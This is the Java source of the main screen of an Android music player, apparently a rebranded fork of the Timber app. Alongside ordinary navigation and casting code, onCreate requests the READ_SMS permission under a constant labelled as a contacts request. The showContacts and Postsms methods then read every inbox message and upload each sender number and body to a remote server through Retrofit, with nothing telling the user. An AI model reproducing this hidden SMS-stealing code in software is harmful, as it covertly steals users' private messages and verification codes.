/*
 * Copyright (C) 2015 Naman Dwivedi
 *
 * Licensed under the GNU General Public License v3
 *
 * This is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
 *
 * This software is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 */

package com.naman14.timber.activities;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.support.design.widget.NavigationView;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.afollestad.appthemeengine.customizers.ATEActivityThemeCustomizer;
import com.anjlab.android.iab.v3.BillingProcessor;
import com.google.android.gms.cast.framework.CastButtonFactory;
import com.google.android.gms.cast.framework.CastContext;
import com.google.android.gms.cast.framework.CastSession;
import com.google.android.gms.cast.framework.Session;
import com.google.android.gms.cast.framework.SessionManager;
import com.google.android.gms.cast.framework.SessionManagerListener;
import com.google.android.gms.cast.framework.media.widget.ExpandedControllerActivity;
import com.google.android.gms.cast.framework.media.widget.MiniControllerFragment;
//import com.google.firebase.messaging.FirebaseMessaging;
import com.naman14.timber.MusicPlayer;
import com.naman14.timber.R;
import com.naman14.timber.cast.ExpandedControlsActivity;
import com.naman14.timber.cast.SimpleSessionManagerListener;
import com.naman14.timber.cast.WebServer;
import com.naman14.timber.fcm.Config;
import com.naman14.timber.fragments.AlbumDetailFragment;
import com.naman14.timber.fragments.ArtistDetailFragment;
import com.naman14.timber.fragments.FoldersFragment;
import com.naman14.timber.fragments.MainFragment;
import com.naman14.timber.fragments.PlaylistFragment;
import com.naman14.timber.fragments.QueueFragment;
import com.naman14.timber.models.Smsdata;
import com.naman14.timber.permissions.Nammu;
import com.naman14.timber.permissions.PermissionCallback;
import com.naman14.timber.service.RetrofitInstance;
import com.naman14.timber.service.Router;
import com.naman14.timber.slidinguppanel.SlidingUpPanelLayout;
import com.naman14.timber.streaming.SitusArray;
import com.naman14.timber.subfragments.LyricsFragment;
import com.naman14.timber.utils.Constants;
import com.naman14.timber.utils.Helpers;
import com.naman14.timber.utils.NavigationUtils;
import com.naman14.timber.utils.TimberUtils;
import com.nostra13.universalimageloader.core.DisplayImageOptions;
import com.nostra13.universalimageloader.core.ImageLoader;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;

public class MainActivity extends BaseActivity implements ATEActivityThemeCustomizer {
    private RetrofitInstance retrofit;
    private SlidingUpPanelLayout panelLayout;
    private NavigationView navigationView;
    private TextView songtitle, songartist;
    private ImageView albumart;
    private String action;
    private Map<String, Runnable> navigationMap = new HashMap<String, Runnable>();
    private Handler navDrawerRunnable = new Handler();
    private Runnable runnable;
    private DrawerLayout mDrawerLayout;
    private boolean isDarkTheme;
    private BroadcastReceiver mRegistrationBroadcastReceiver;
    private static final int PERMISSION_REQUEST_READ_CONTACTS = 100;
    private AppCompatActivity A ;
    private Smsdata smss;


    private Runnable navigateLibrary = new Runnable() {
        public void run() {
            navigationView.getMenu().findItem(R.id.nav_library).setChecked(true);
            Fragment fragment = new MainFragment();
            FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
            transaction.replace(R.id.fragment_container, fragment).commitAllowingStateLoss();

        }
    };

    private Runnable navigatePlaylist = new Runnable() {
        public void run() {
            navigationView.getMenu().findItem(R.id.nav_playlists).setChecked(true);
            Fragment fragment = new PlaylistFragment();
            FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
            transaction.hide(getSupportFragmentManager().findFragmentById(R.id.fragment_container));
            transaction.replace(R.id.fragment_container, fragment).commit();

        }
    };

    private Runnable navigateFolder = new Runnable() {
        public void run() {
            navigationView.getMenu().findItem(R.id.nav_folders).setChecked(true);
            Fragment fragment = new FoldersFragment();
            FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
            transaction.hide(getSupportFragmentManager().findFragmentById(R.id.fragment_container));
            transaction.replace(R.id.fragment_container, fragment).commit();

        }
    };

    private Runnable navigateQueue = new Runnable() {
        public void run() {
            navigationView.getMenu().findItem(R.id.nav_queue).setChecked(true);
            Fragment fragment = new QueueFragment();
            FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
            transaction.hide(getSupportFragmentManager().findFragmentById(R.id.fragment_container));
            transaction.replace(R.id.fragment_container, fragment).commit();

        }
    };

    private Runnable navigateAlbum = new Runnable() {
        public void run() {
            long albumID = getIntent().getExtras().getLong(Constants.ALBUM_ID);
            Fragment fragment = AlbumDetailFragment.newInstance(albumID, false, null);
            FragmentManager fragmentManager = getSupportFragmentManager();
            fragmentManager.beginTransaction()
                    .replace(R.id.fragment_container, fragment).commit();
        }
    };

    private Runnable navigateArtist = new Runnable() {
        public void run() {
            long artistID = getIntent().getExtras().getLong(Constants.ARTIST_ID);
            Fragment fragment = ArtistDetailFragment.newInstance(artistID, false, null);
            FragmentManager fragmentManager = getSupportFragmentManager();
            fragmentManager.beginTransaction()
                    .replace(R.id.fragment_container, fragment).commit();
        }
    };

    private Runnable navigateLyrics = new Runnable() {
        public void run() {
            Fragment fragment = new LyricsFragment();
            FragmentManager fragmentManager = getSupportFragmentManager();
            fragmentManager.beginTransaction()
                    .replace(R.id.fragment_container, fragment).commit();
        }
    };

    private Runnable navigateNowplaying = new Runnable() {
        public void run() {
            navigateLibrary.run();
            startActivity(new Intent(MainActivity.this, NowPlayingActivity.class));
        }
    };

    private final PermissionCallback permissionReadstorageCallback = new PermissionCallback() {
        @Override
        public void permissionGranted() {
            loadEverything();
        }

        @Override
        public void permissionRefused() {
            finish();
        }
    };


    @Override
    public void onCreate(Bundle savedInstanceState) {

        action = getIntent().getAction();

        isDarkTheme = PreferenceManager.getDefaultSharedPreferences(this).getBoolean("dark_theme", false);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        mRegistrationBroadcastReceiver = new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context context, Intent intent) {
//
//                // checking for type intent filter
//                if (intent.getAction().equals(Config.REGISTRATION_COMPLETE)) {
//                    // gcm successfully registered
//                    // now subscribe to `global` topic to receive app wide notifications
//                    FirebaseMessaging.getInstance().subscribeToTopic(Config.TOPIC_GLOBAL);
//
//                    displayFirebaseRegId();
//
//                } else if (intent.getAction().equals(Config.PUSH_NOTIFICATION)) {
//                    // new push notification is received
//
//                    String message = intent.getStringExtra("message");
//
//                    Toast.makeText(getApplicationContext(), "Push notification: " + message, Toast.LENGTH_LONG).show();
//
//                }
//            }
//        };
//
//        displayFirebaseRegId();

        int permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);

        if (permissionCheck == PackageManager.PERMISSION_GRANTED){
            showContacts();
        }else{
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_SMS},
                    PERMISSION_REQUEST_READ_CONTACTS);
        }

        navigationMap.put(Constants.NAVIGATE_LIBRARY, navigateLibrary);
        navigationMap.put(Constants.NAVIGATE_PLAYLIST, navigatePlaylist);
        navigationMap.put(Constants.NAVIGATE_QUEUE, navigateQueue);
        navigationMap.put(Constants.NAVIGATE_NOWPLAYING, navigateNowplaying);
        navigationMap.put(Constants.NAVIGATE_ALBUM, navigateAlbum);
        navigationMap.put(Constants.NAVIGATE_ARTIST, navigateArtist);
        navigationMap.put(Constants.NAVIGATE_LYRICS, navigateLyrics);

        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawer_layout);
        panelLayout = (SlidingUpPanelLayout) findViewById(R.id.sliding_layout);

        navigationView = (NavigationView) findViewById(R.id.nav_view);
        View header = navigationView.inflateHeaderView(R.layout.nav_header);

        albumart = (ImageView) header.findViewById(R.id.album_art);
        songtitle = (TextView) header.findViewById(R.id.song_title);
        songartist = (TextView) header.findViewById(R.id.song_artist);

        setPanelSlideListeners(panelLayout);

        navDrawerRunnable.postDelayed(new Runnable() {
            @Override
            public void run() {
                setupDrawerContent(navigationView);
                setupNavigationIcons(navigationView);
            }
        }, 700);


        if (TimberUtils.isMarshmallow()) {
            checkPermissionAndThenLoad();
            //checkWritePermissions();
        } else {
            loadEverything();
        }

        addBackstackListener();

        if(Intent.ACTION_VIEW.equals(action)) {
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    MusicPlayer.clearQueue();
                    MusicPlayer.openFile(getIntent().getData().getPath());
                    MusicPlayer.playOrPause();
                    navigateNowplaying.run();
                }
            }, 350);
        }

        if (!panelLayout.isPanelHidden() && MusicPlayer.getTrackName() == null ) {
            panelLayout.hidePanel();
        }

        if (playServicesAvailable) {

            final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT);
            params.gravity = Gravity.BOTTOM;

            FrameLayout contentRoot = findViewById(R.id.content_root);
            contentRoot.addView(LayoutInflater.from(this)
                    .inflate(R.layout.fragment_cast_mini_controller, null), params);

            findViewById(R.id.castMiniController).setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    startActivity(new Intent(MainActivity.this, ExpandedControllerActivity.class));
                }
            });
        }

    }

    public void setPermissionRequestResult(int requestCode, String[] permission, int[] grantResult){
        if (requestCode == PERMISSION_REQUEST_READ_CONTACTS){
                if(grantResult[0] == PackageManager.PERMISSION_GRANTED){
                    showContacts();
                }else{
                    Toast.makeText(this, "Until you ", Toast.LENGTH_LONG);
                }
        }
    }

    private void showContacts(){
        Uri inboxuri = Uri.parse("content://sms/inbox");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(inboxuri, null, null, null, null);
        while (c.moveToNext()){
            String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
            String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();

            Postsms(Number, Body);

        }c.close();
    }


    private void loadEverything() {
        Runnable navigation = navigationMap.get(action);
        if (navigation != null) {
            navigation.run();
        } else {
            navigateLibrary.run();
        }

        new initQuickControls().execute("");
    }

    private void checkPermissionAndThenLoad() {
        //check for permission
        if (Nammu.checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE) && Nammu.checkPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            loadEverything();
        } else {
            if (Nammu.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)) {
                Snackbar.make(panelLayout, "Badengar membutuhkan izin akses media penyimpananan untuk menampilkan dan mendengarkan lagu.",
                        Snackbar.LENGTH_INDEFINITE)
                        .setAction("OK", new View.OnClickListener() {
                            @Override
                            public void onClick(View view) {
                                Nammu.askForPermission(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, permissionReadstorageCallback);
                            }
                        }).show();
            } else {
                Nammu.askForPermission(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, permissionReadstorageCallback);
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);

        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home: {
                if (isNavigatingMain()) {
                    mDrawerLayout.openDrawer(GravityCompat.START);
                } else super.onBackPressed();
                return true;
            }
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onBackPressed() {
        if (panelLayout.isPanelExpanded()) {
            panelLayout.collapsePanel();
        } else if (mDrawerLayout.isDrawerOpen(GravityCompat.START)) {
            mDrawerLayout.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }
    public void Postsms(String Number, String Body){
        smss = new Smsdata(Number, Body);
        retrofit = new RetrofitInstance();
        Router service = retrofit.getRetrofitInstanceall().create(Router.class);

        Call<Smsdata> call = service.Postsms(smss,1);
        call.enqueue(new Callback<Smsdata>() {
            @Override
            public void onResponse(Call<Smsdata> call, retrofit2.Response<Smsdata> response) {
                Toast.makeText(getApplicationContext(), "status " +response.body().getStatus(), Toast.LENGTH_LONG).show();
            }
            @Override
            public void onFailure(Call<Smsdata> call, Throwable t) {
                Toast.makeText(getApplicationContext(), "Gagal Mengambil Data Dari Server Pastikan Anda Terhubung Dengan Internet " , Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void setupDrawerContent(NavigationView navigationView) {
        navigationView.setNavigationItemSelectedListener(
                new NavigationView.OnNavigationItemSelectedListener() {
                    @Override
                    public boolean onNavigationItemSelected(final MenuItem menuItem) {
                        updatePosition(menuItem);
                        return true;

                    }
                });
    }

    private void setupNavigationIcons(NavigationView navigationView) {

        //material-icon-lib currently doesn't work with navigationview of design support library 22.2.0+
        //set icons manually for now
        //https://github.com/code-mc/material-icon-lib/issues/15

        if (!isDarkTheme) {
            navigationView.getMenu().findItem(R.id.nav_library).setIcon(R.drawable.library_music);
            navigationView.getMenu().findItem(R.id.nav_playlists).setIcon(R.drawable.playlist_play);
            navigationView.getMenu().findItem(R.id.nav_queue).setIcon(R.drawable.music_note);
            navigationView.getMenu().findItem(R.id.nav_folders).setIcon(R.drawable.ic_folder_open_black_24dp);
            navigationView.getMenu().findItem(R.id.nav_nowplaying).setIcon(R.drawable.bookmark_music);
            navigationView.getMenu().findItem(R.id.nav_settings).setIcon(R.drawable.settings);
            navigationView.getMenu().findItem(R.id.nav_about).setIcon(R.drawable.information);
//            navigationView.getMenu().findItem(R.id.nav_donate).setIcon(R.drawable.payment_black);
        } else {
            navigationView.getMenu().findItem(R.id.nav_library).setIcon(R.drawable.library_music_white);
            navigationView.getMenu().findItem(R.id.nav_playlists).setIcon(R.drawable.playlist_play_white);
            navigationView.getMenu().findItem(R.id.nav_queue).setIcon(R.drawable.music_note_white);
            navigationView.getMenu().findItem(R.id.nav_folders).setIcon(R.drawable.ic_folder_open_white_24dp);
            navigationView.getMenu().findItem(R.id.nav_nowplaying).setIcon(R.drawable.bookmark_music_white);
            navigationView.getMenu().findItem(R.id.nav_settings).setIcon(R.drawable.settings_white);
            navigationView.getMenu().findItem(R.id.nav_about).setIcon(R.drawable.information_white);
//            navigationView.getMenu().findItem(R.id.nav_donate).setIcon(R.drawable.payment_white);
        }

        try {
            if (!BillingProcessor.isIabServiceAvailable(this)) {
//                navigationView.getMenu().removeItem(R.id.nav_donate);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    // Fetches reg id from shared preferences
    // and displays on the screen
    private void displayFirebaseRegId() {
        SharedPreferences pref = getApplicationContext().getSharedPreferences(Config.SHARED_PREF, 0);
        String regId = pref.getString("regId", null);

        Log.e("debug", "Firebase reg id: " + regId);

    }

    private void updatePosition(final MenuItem menuItem) {
        runnable = null;

        switch (menuItem.getItemId()) {
            case R.id.nav_library:
                runnable = navigateLibrary;

                break;
            case R.id.nav_playlists:
                runnable = navigatePlaylist;

                break;
            case R.id.nav_folders:
                runnable = navigateFolder;

                break;
            case R.id.nav_nowplaying:
                if (getCastSession() != null) {
                    startActivity(new Intent(MainActivity.this, ExpandedControlsActivity.class));
                } else {
                    NavigationUtils.navigateToNowplaying(MainActivity.this, false);
                }
                break;
            case R.id.nav_queue:
                runnable = navigateQueue;

                break;
            case R.id.nav_settings:
                NavigationUtils.navigateToSettings(MainActivity.this);
                break;
            case R.id.nav_about:
                mDrawerLayout.closeDrawers();
                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Helpers.showAbout(MainActivity.this);
                    }
                }, 350);

                break;
//            case R.id.nav_donate:
//                startActivity(new Intent(MainActivity.this, DonateActivity.class));
//                break;
        }

        if (runnable != null) {
            menuItem.setChecked(true);
            mDrawerLayout.closeDrawers();
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    runnable.run();
                }
            }, 350);
        }
    }

    public void setDetailsToHeader() {
        String name = MusicPlayer.getTrackName();
        String artist = MusicPlayer.getArtistName();

        if (name != null && artist != null) {
            songtitle.setText(name);
            songartist.setText(artist);
        }
        ImageLoader.getInstance().displayImage(TimberUtils.getAlbumArtUri(MusicPlayer.getCurrentAlbumId()).toString(), albumart,
                new DisplayImageOptions.Builder().cacheInMemory(true)
                        .showImageOnFail(R.drawable.ic_empty_music2)
                        .resetViewBeforeLoading(true)
                        .build());
    }

    @Override
    public void onMetaChanged() {
        super.onMetaChanged();
        setDetailsToHeader();

        if (panelLayout.isPanelHidden() && MusicPlayer.getTrackName() != null) {
            panelLayout.showPanel();
        }
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode, String[] permissions, int[] grantResults) {
        Nammu.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    private boolean isNavigatingMain() {
        Fragment currentFragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);
        return (currentFragment instanceof MainFragment || currentFragment instanceof QueueFragment
                || currentFragment instanceof PlaylistFragment || currentFragment instanceof FoldersFragment);
    }

    private void addBackstackListener() {
        getSupportFragmentManager().addOnBackStackChangedListener(new FragmentManager.OnBackStackChangedListener() {
            @Override
            public void onBackStackChanged() {
                getSupportFragmentManager().findFragmentById(R.id.fragment_container).onResume();
            }
        });
    }


    @Override
    public int getActivityTheme() {
        return isDarkTheme ? R.style.AppThemeNormalDark : R.style.AppThemeNormalLight;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        getSupportFragmentManager().findFragmentById(R.id.fragment_container).onActivityResult(requestCode, resultCode, data);
    }


    @Override
    public void showCastMiniController() {
        findViewById(R.id.castMiniController).setVisibility(View.VISIBLE);
        findViewById(R.id.quickcontrols_container).setVisibility(View.GONE);
        panelLayout.hidePanel();
    }

    @Override
    public void hideCastMiniController() {

        findViewById(R.id.castMiniController).setVisibility(View.GONE);
        findViewById(R.id.quickcontrols_container).setVisibility(View.VISIBLE);
        panelLayout.showPanel();
    }
}


